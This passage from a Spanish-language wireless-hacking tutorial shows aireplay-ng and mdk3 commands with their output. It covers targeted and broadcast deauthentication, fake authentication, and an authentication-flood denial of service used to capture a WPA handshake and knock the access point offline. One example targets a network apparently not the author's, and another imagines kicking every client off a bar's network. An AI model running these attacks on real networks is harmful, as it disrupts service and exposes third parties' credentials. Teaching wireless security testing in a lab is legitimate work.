└──╼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]
20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
```

Ahora bien, para saber si nuestros paquetes están surtiendo efecto sobre la estación, el truco está en
contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '**[18|65 ACks]**'.
Siempre que este sea mayor que 0, ello querrá decir que nuestros paquetes están siendo enviados correctamente
a la estación.

Si haces estas practicas en local, podrás comprobar cómo tu dispositivo en caso de haber sido la estación
víctima, habría sido desconectado del AP. Por otro lado, aunque lo veremos más adelante, imaginemos que ahora
paramos el ataque, ¿qué creéis que pasaría?. Fijaros que en la mayoría de las veces, los dispositivos tienden
a recordar los puntos de acceso a los que alguna vez han estado conectados. 

Esto es así debido a los paquetes **Probe Request**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2>/dev/null
   49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  473 17.062963738 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  487 17.411192451 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  511 18.533411763 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab
  512 18.552100778 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab
  513 18.556049394 IntelCor_46:d1:38 → Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  515 18.649006729 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  516 18.650498757 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  517 18.669117644 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  518 18.670480133 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  519 18.691337428 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Y es justamente aquí donde está la gracia, pues de parar el ataque, el dispositivo lo que de manera automática
hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generará el Handshake:

```bash
 CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab
 ```

 Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la dirección
 MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
 que se acaba de reasociar.

 Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.

 #### Ataque de deautenticación global

 Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
 establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es más factible lanzar
 otro tipo de ataque, el **ataque de deautenticación global**.

 A diferencia del ataque de deautenticación dirigido, en el ataque de deautenticación global, se hace uso de
 una **Broadcast MAC Address** como dirección MAC de estación objetivo a utilizar. Lo que conseguimos con esta
 dirección MAC, es expulsar a todos los clientes que se encuentren asociados el AP.

 Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
 no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
 ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estación). En vez de estar por tanto
 deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
 para que capturemos un Handshake, resulta más cómodo expulsarlos a todos.

 Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake válido. Hay que tener en
 cuenta que es posible capturar múltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
 esto no supone ningún problema.

 El ataque se puede elaborar de 2 formas, una es la siguiente:

 * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

Obteniendo los siguientes resultados:

 ```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
 ```

Y la otra sin especificar ninguna dirección MAC, lo que por defecto la suite interpretará como un ataque de
deautenticación global:

* aireplay-ng -0 0 -e hacklab wlan0mon

Obteniendo estos resultados:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab wlan0mon
21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
```

#### Ataque de autenticación

Puede sonar raro, pero también existe un ataque llamado ataque de autenticación o asociación. A través de este
ataque, en vez de expulsar a clientes de una red, lo que hacemos es añadirlos.

Te preguntarás, ¿y qué consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que
de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake. 

¿Qué crees que pasaría si en una red inyectamos 5.000 clientes?, exacto, por ahí van los tiros. Si una red
dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta notaríamos de hacerlo en local
que la red comenzaría a ir lenta, llegando al punto en el que seríamos expulsados de esta hasta detener el
ataque.

Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro '**-1**' de aireplay:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep "\-1" | sed '/^\s*$/d' | sed 's/^ *//'; echo

--fakeauth    delay : fake authentication with AP (-1)
```

Imaginemos que tenemos este escenario:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                
```

Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación haciendo uso de nuestra tarjeta de red
como estación:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
Found BSSID "1C:B0:44:D4:16:78" to given ESSID "MOVISTAR_1677".

21:20:28  Sending Authentication Request (Open System) [ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request (Open System) [ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request (Open System) [ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request [ACK]
21:20:38  Association successful :-) (AID: 1)
```

Con el parámetro '**-h**', especificamos la dirección MAC del falso cliente a autenticar. Si volvemos a
analizar ahora la red inalámbrica, podremos ver que nuestra tarjeta de red figura como cliente:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     
 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
```

Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
gracia, estaríamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engañar al router,
haciéndole creer que dispone de ese cliente asociado.

A efectos prácticos, por el momento esto no genera ningún inconveniente, ¿cómo autenticamos por tanto ahora a
5.000 clientes?. Podríamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, **mdk3**.

A través de la utilidad **mdk3**, tenemos un modo de ataque '**Authentication DoS Mode**' que se encarga de
asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:

* mdk3 wlan0mon a -a bssidAP

Veámoslo en la práctica, aplicamos el comando por un lado:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab
```

Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:

```bash
 CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         
                                                                                         
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                         
 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
                                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
                                                                                         
 (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       
 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
```

Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
los clientes más lejanos o con poca señal WiFi.














 

















